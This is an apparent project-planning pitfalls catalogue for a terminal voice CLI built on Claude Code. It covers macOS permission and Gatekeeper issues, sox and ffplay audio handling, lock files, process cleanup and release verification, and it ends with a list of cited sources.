- [ ] **Init wizard:** `achilles init` walks API key + mic detect + ambient calibration + smoke test + intro screen. All five steps. From a clean `~/.achilles/`.
- [ ] **Persistence:** `--save-transcripts` writes JSONL with 0o600 mode AND `achilles transcripts list` finds them AND `achilles transcripts purge` deletes them.
- [ ] **Lock file:** Second `achilles voice` invocation refuses to start AND prints the running PID AND first instance shuts down cleanly removes the lock.
- [ ] **Latency probe:** `--debug` enables the probe; `achilles latency --report` prints P50/P95 from real samples (not mocked).
- [ ] **Incident detection:** STT circuit breaker AND TTS circuit breaker AND typed-fallback path are all reachable in the binary. Test by setting an invalid API key and verifying typed-fallback engages.
- [ ] **Stuck-thinking watchdog:** 60s with no Claude streaming output fires the "Working on that, this is taking a while..." announcement. Test by mocking a frozen claude subprocess.
- [ ] **macOS Gatekeeper:** the published binary on npm passes `spctl --assess --type execute` from a fresh macOS account. Test by `npm install` on a fresh VM, NOT on the dev machine.
- [ ] **macOS TCC:** mic permission attribution works from the documented terminal emulators (iTerm2, Terminal.app, ghostty, Warp) AND the failure mode in VS Code's integrated terminal is documented + has a remediation script.
- [ ] **Sox detection:** Phase 18 init wizard catches missing sox AND prints the per-platform install line AND optionally offers to invoke the package manager.
- [ ] **ffmpeg detection:** same shape as sox; tested separately.
- [ ] **VS Code terminal smoke:** Phase 20 includes an asciicast captured from inside VS Code's integrated terminal (the worst-case macOS TCC scenario).
- [ ] **Skill body smoke:** Phase 20 includes a recording of the skill body invocation from inside Claude Code (the worst-case skill timeout + permission re-prompt scenario).
- [ ] **Bun vs Node fallback:** both paths boot AND complete the smoke test; the dual-runtime CI matrix asserts identical state-transition timestamps.

---

## Recovery Strategies

When pitfalls occur in production despite prevention, how to recover with minimal user-facing damage.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| User reports "silent launch" (any cause) | LOW | 1. Run `achilles voice --debug 2>&1 | tee /tmp/achilles.log`. 2. Inspect log for last successful state. 3. Match against the documented failure modes table. 4. If macOS TCC: run Pitfall 2 remediation. 5. If sox/ffmpeg missing: run Pitfall 4 remediation. 6. If Bun binary quarantined: run Pitfall 3 xattr line. |
| Stale lock file blocks restart | LOW | `rm ~/.achilles/voice.lock` (documented in `achilles voice` startup error message). Investigate why graceful shutdown missed it (likely SIGKILL or panic). |
| Orphaned sox/ffplay/claude processes | LOW | `pkill -f 'sox.*16000'; pkill -f ffplay; pkill -f 'claude.*--append-system-prompt-file'`. Documented as "achilles reset" subcommand. Phase 20 should add this. |
| Mic permission silently denied on macOS | MEDIUM | Re-run `achilles init` from Terminal.app (NOT VS Code's terminal). If grant still doesn't fire: `tccutil reset Microphone com.apple.Terminal`, restart Terminal.app, try again. Documented remediation script. |
| ElevenLabs key wrong / expired | LOW | The SAFE-05 circuit breaker engages, typed-fallback mode renders, IncidentStatus dot turns red. User updates the env var or re-runs `achilles init` to set a new key. |
| Bun binary not bootable on a new macOS version | MEDIUM | Fall back to Node bundle path (`ACHILLES_FORCE_NODE=1 achilles voice`). Document this env var in README. Phase 8 of distribution should support it. |
| ffplay underrun causes choppy audio | LOW | Set `ACHILLES_FFPLAY_BUFFER=conservative` env var → switches to `-fflags +nobuffer` removed (use defaults). Documents the tradeoff: higher latency, no underruns. |
| VAD continuously triggers in noisy room | LOW | `achilles init --recalibrate` re-runs ambient noise measurement. Pin a higher threshold in `~/.achilles/settings.json`. Or run with `--vad-threshold 0.05` override. |
| Skill body times out after 120s | MEDIUM | Document `BASH_MAX_TIMEOUT_MS` in `~/.claude/settings.json`. Without this, the skill cannot run a session longer than 2 minutes. Phase 19 SKILL.md must include this as the first instruction. |
| Lock file left from a crash, second instance won't start | LOW | Show the PID in the error: "Another achilles voice session is running (pid 12345)." If `kill -0 12345` fails (process is gone), auto-cleanup the lock. Phase 20 should implement this auto-cleanup. |
| ElevenLabs WSS connection stuck open (billing) | MEDIUM | Phase 17 timeout: if no traffic for >120s while in `idle`, close the WSS. Reopen on next `speech_start`. Saves money during long idle periods. |

---

## Pitfall-to-Phase Mapping

How v1.3 phases (15-20 per `.planning/research/v1.3-terminal-pivot.md` §11) prevent each pitfall.

| Pitfall | Prevention Phase(s) | Verification |
|---------|---------------------|--------------|
| 1: Verified code-side but broken in binary | **Phase 17 (CI in-process smoke gate) + Phase 20 (real-binary asciicasts SC-1/2/3)** | Three asciicasts in `.planning/milestones/v1.3-evidence/` captured from fresh macOS-arm64 + linux-x64 + win32-x64. Audit cannot mark v1.3 anything but `tech_debt` without them. |
| 2: macOS TCC parent-process attribution | **Phase 18 (init wizard remediation script) + Phase 19 (skill body pre-flight)** | Asciicast from VS Code's integrated terminal showing the EPERM detection + remediation message. Manual test from iTerm2 / Terminal.app / ghostty / Warp confirms expected prompt fires. |
| 3: macOS Gatekeeper / quarantine | **Phase 19 (signed-binary build pipeline + cert acquisition gate)** | `spctl --assess --type execute --verbose` from a fresh macOS account returns "accepted." `xattr -p com.apple.quarantine $(which achilles)` returns no quarantine flag (or, for v1.3-beta, returns the flag AND the install instructions handle it). |
| 4: sox/ffmpeg device-open failure (silent) | **Phase 18 (init wizard real-device smoke) + Phase 16 (mic-capture exit-code handler)** | Phase 18 smoke captures stderr + matches against the known-error table. Phase 16 respawn-on-EIO captures sox death + restarts up to 3 times. |
| 5: Ink reconciliation thrash | **Phase 16 (TUI shell + Ink perf budget)** | CPU <10% during 10-minute 20fps animation on slowest target (Windows Terminal v1.18 on 2019 laptop). No visible flicker over 30-second screen capture. |
| 6: Energy-VAD false-starts/missed-speech | **Phase 16 (adaptive thresholds) + Phase 18 (ambient calibration) + Phase 20 (noisy-environment SC)** | 5-second calibration step in init wizard. Adaptive thresholds via EWMA. Phase 20 asciicast in a 65 dBA environment confirms no continuous trigger on music. |
| 7: ffplay buffering tradeoff | **Phase 17 (orchestrator + ffplay benchmark)** | 100-trial benchmark of flag combinations. Documented latency budget P50<500ms, P95<800ms. Backpressure on stdin write. Cancel via SIGTERM with 1s deadline. |
| 8: Bun ↔ Node runtime drift | **Phase 15 (dual-runtime CI matrix) + Phase 17 (runtime-independent shim layer)** | CI matrix: every test runs under both `bun test` AND `vitest`. Compiled-binary-vs-Node-fallback smoke target asserts identical state transitions (±50ms tolerance). |
| 9: Skill body lifecycle | **Phase 17 (signal handling + process-group detach) + Phase 19 (SKILL.md authoring + `BASH_MAX_TIMEOUT_MS` doc) + Phase 20 (skill teardown asciicast)** | `BASH_MAX_TIMEOUT_MS=86400000` documented at top of SKILL.md. Phase 17 SIGTERM handler completes in <1s. Phase 20 asciicast confirms no orphans after Ctrl-C in Claude Code context. |
| 10: SIGINT propagation / WSS leak | **Phase 17 (gracefulShutdown + process-group orchestration) + Phase 20 (post-Ctrl-C inspection in SC-1)** | Asciicast verifies `ps` after Ctrl-C shows no orphans. WSS close codes 1000 logged. Lock file removed. Ink raw mode restored. |

---

## Sources

### v1.2 codebase artifacts
- [v1.2 silent-launch debug](/Users/lakshmanturlapati/Documents/Codes/Handoff/.planning/debug/achilles-silent-launch.md) — root cause of the "verified code-side but DOA" failure that triggered v1.3
- [v1.2 milestone audit](/Users/lakshmanturlapati/Documents/Codes/Handoff/.planning/milestones/v1.2-MILESTONE-AUDIT.md) — the audit that signed off on a broken binary; §5 lists the human-verification debt this pitfall catalogue replaces with structural gates
- [v1.3 terminal pivot architecture research](/Users/lakshmanturlapati/Documents/Codes/Handoff/.planning/research/v1.3-terminal-pivot.md) — the implementation-ready architecture this pitfall catalogue mirrors; §10 lists open risks that have been concretised into Pitfalls 2, 3, 5, 9, 10
- [Project state](/Users/lakshmanturlapati/Documents/Codes/Handoff/.planning/PROJECT.md) — v1.3 scope and the explicit "must not repeat the v1.2 silent-launch shape" constraint

### macOS TCC / Gatekeeper
- [macOS: Child processes cannot access TCC-protected resources (microsoft/vscode#307364)](https://github.com/microsoft/vscode/issues/307364) — primary citation for VS Code integrated terminal TCC failure mode (May 2026)
- [macOS: apps launched from integrated terminal can't request TCC permissions (pingdotgg/t3code#728)](https://github.com/pingdotgg/t3code/issues/728) — confirms the same shape for camera + mic
- [The Curious Case of the Responsible Process (Michael Tsai)](https://mjtsai.com/blog/2025/07/07/the-curious-case-of-the-responsible-process/) — responsible-process resolution algorithm in macOS TCC
- [macOS TCC (HackTricks)](https://angelica.gitbook.io/hacktricks/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc) — reverse-engineered behaviour of TCC.db + parent process walks
- [Apple TCC documentation referenced in Cursor forum](https://forum.cursor.com/t/repeated-macos-tcc-prompt-allow-cursor-vscode-to-access-xcode-when-using-xcode-tools-mcp/158553) — confirms Cursor (and similar electron IDEs) have the same shape
- [Codesign a single-file JavaScript executable on macOS (Bun docs)](https://bun.com/docs/guides/runtime/codesign-macos-executable) — official Bun guide to deep-signing compiled binaries
- [Cannot code-sign compiled executable on macOS (oven-sh/bun#7208)](https://github.com/oven-sh/bun/issues/7208) — historical Bun bug, resolved 1.2+, confirms `--deep` is required
- [Exhaustive Guide to Signing and Notarizing on macOS (Armaan Aggarwal)](https://armaan.cc/blog/signing-and-notarizing-macos) — current notarytool workflow
- [So You Want to Code-Sign macOS Binaries? (Dennis Babkin)](https://dennisbabkin.com/blog/?t=how-to-get-certificate-code-sign-notarize-macos-binaries-outside-apple-app-store) — Apple Developer ID acquisition + binary distribution

### Audio / sox / ffplay
- [SoX Homebrew formula](https://formulae.brew.sh/formula/sox) — current Homebrew install
- [Recompiling SoX for M3/M4 Macs (Pasindu Mendis, Medium)](https://medium.com/@pasindu.mendi/recompiling-sox-for-m3-m4-macs-a-journey-through-code-and-persistence-9c4724a62d8f) — sox arm64 compatibility issues
- [sox-recompiled binary for M3/M4 Macs](https://github.com/Pasindu-Heshan/sox-recompiled) — fallback binary
- [FFplay network stream with low latency (ffmpeg-user 2018)](https://ffmpeg-user.ffmpeg.narkive.com/l27ySmL6/ffplay-network-stream-with-low-latency) — primary citation for `-fflags nobuffer -flags low_delay -probesize 32` recipe
- [How do I make ffplay play without high latency? (ffmpeg-user)](https://ffmpeg-user.ffmpeg.narkive.com/ubWP31iw/how-do-i-make-ffplay-play-without-high-latency) — supplementary
- [FFplay documentation](https://ffmpeg.org/ffplay.html) — official option reference
- [FAQs: Reduce Latency with FFplay (Exvist)](https://support.exvist.com/portal/en/kb/hdmi-encoder/faqs/network/articles/faqs-encoder-reduce-latency-with-ffplay) — production tuning guide

### Ink / TUI rendering
- [vadimdemedes/ink (GitHub)](https://github.com/vadimdemedes/ink) — official Ink repo; refresh-rate cap
- [Refresh rate (vadimdemedes/ink discussion #657)](https://github.com/vadimdemedes/ink/discussions/657) — 30fps cap rationale
- [test-ink-flickering INK-ANALYSIS.md](https://github.com/atxtechbro/test-ink-flickering/blob/main/INK-ANALYSIS.md) — Ink full-tree reconciliation cost analysis
- [React in the Terminal: Ink 7.0 (heise online)](https://www.heise.de/en/news/React-in-the-Terminal-Ink-7-0-fundamentally-revises-input-handling-11249949.html) — Ink 7.0 input handling
- [Ink 3 release notes (Vadim Demedes)](https://vadimdemedes.com/posts/ink-3) — perf improvements
- [How Claude Code Uses React in the Terminal (DEV Community)](https://dev.to/vilvaathibanpb/how-claude-code-uses-react-in-the-terminal-2f3b) — Ink production patterns

### VAD
- [Voice Activity Detection (VAD) in Noisy Environments (arxiv 2312.05815)](https://arxiv.org/pdf/2312.05815) — adaptive threshold algorithms
- [Voice Activity Detection (VAD) Optimization Ultimate Guide (VEXYL AI)](https://vexyl.ai/voice-activity-detection/) — threshold sensitivity values 0.35-0.45 for noisy, 0.3-0.4 for diverse users
- [Voice Activity Detection (Picovoice complete guide 2026)](https://picovoice.ai/blog/complete-guide-voice-activity-detection-vad/) — production VAD design
- [Voice activity detection (Wikipedia)](https://en.wikipedia.org/wiki/Voice_activity_detection) — algorithm fundamentals + frequency filtering
- [OpenAI VAD docs](https://developers.openai.com/api/docs/guides/realtime-vad) — production VAD recommendations from OpenAI

### Bun / Node compatibility
- [Bun Node.js Compatibility docs](https://bun.com/docs/runtime/nodejs-compat) — official Bun compat surface
- [Bun vs Node.js 2026 (Tech Insider)](https://tech-insider.org/bun-vs-nodejs-2026/) — 2026 benchmark + compat survey
- [Bun vs Node.js Migration Guide (Strapi 2026)](https://strapi.io/blog/bun-vs-nodejs-performance-comparison-guide) — production migration considerations
- [Bun Compatibility 2026 (Alex Cloudstar)](https://www.alexcloudstar.com/blog/bun-compatibility-2026-npm-nodejs-nextjs/) — supplementary
- [Bun Spawn docs](https://bun.sh/docs/api/spawn) — Bun.spawn API
- [Node child_process.spawn function (Bun reference)](https://bun.com/reference/node/child_process/spawn) — node-compat shim details

### Claude Code skills
- [Claude Code skill docs](https://code.claude.com/docs/en/skills) — skill body invocation
- [Bash tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/bash-tool) — Bash tool lifecycle
- [Bash tool timeout kills Claude Code (anthropics/claude-code#45717)](https://github.com/anthropics/claude-code/issues/45717) — SIGTERM propagation bug
- [Complete Claude Code Timeout Configuration Guide (anthropics/claude-code#5615)](https://github.com/anthropics/claude-code/issues/5615) — BASH_DEFAULT_TIMEOUT_MS + BASH_MAX_TIMEOUT_MS
- [Skill allowed-tools multi-prompt bug (anthropics/claude-code#60515)](https://github.com/anthropics/claude-code/issues/60515) — second-Bash-call re-prompt issue
- [Critical Bug: Background Bash Processes (anthropics/claude-code#11716)](https://github.com/anthropics/claude-code/issues/11716) — why we cannot run `achilles voice &`

### npm distribution / platform-specific binaries
- [npm CLI optionalDependencies bug (npm/cli#4828)](https://github.com/npm/cli/issues/4828) — platform-specific deps + package-lock.json regen issue
- [Different strategy for installing platform-specific binaries (evanw/esbuild#789)](https://github.com/evanw/esbuild/issues/789) — esbuild's solution that we mirror
- [How to publish binaries on npm (Sentry Engineering)](https://sentry.engineering/blog/publishing-binaries-on-npm) — modern recommended pattern
- [That Weird NPM Bug That Broke My Build (Loke.dev)](https://loke.dev/blog/npm-platform-specific-dependencies-bug) — bug shape + workaround
- [bunx docs](https://bun.com/docs/pm/bunx) — bunx caching behaviour

### Signal propagation / process groups
- [SIGINT Propagation Between Parent and Child Processes (Baeldung)](https://www.baeldung.com/linux/signal-propagation) — process group fundamentals
- [How to propagate SIGTERM to child process in Bash (veithen.io)](https://veithen.io/2014/11/16/sigterm-propagation.html) — pattern we mirror in gracefulShutdown

### CLI testing
- [Integration tests on Node.js CLI: Part 1 (Andrés Zorro)](https://medium.com/@zorrodg/integration-tests-on-node-js-cli-part-1-why-and-how-fa5b1ba552fe) — real-binary integration test pattern
- [Tips for making a CLI-based tool with node (Kent C. Dodds)](https://kentcdodds.com/blog/tips-for-making-a-cli-based-tool-with-node) — CLI design considerations
- [Smoke testing with CircleCI (MailSlurp)](https://www.mailslurp.com/blog/smoke-test-circleci-jest-nodejs/) — smoke-test methodology

---

*Pitfalls research for: v1.3 Terminal-only Achilles*
*Researched: 2026-06-08*
*Confidence: HIGH (replays grounded in `.planning/debug/achilles-silent-launch.md`); MEDIUM-HIGH (everything else, cross-referenced against `.planning/research/v1.3-terminal-pivot.md` §10 + 2026 ecosystem sources)*
*Downstream consumer: roadmapper + planner — each pitfall maps to Phase 15-20 with a concrete verification gate, not generic "test thoroughly" advice*
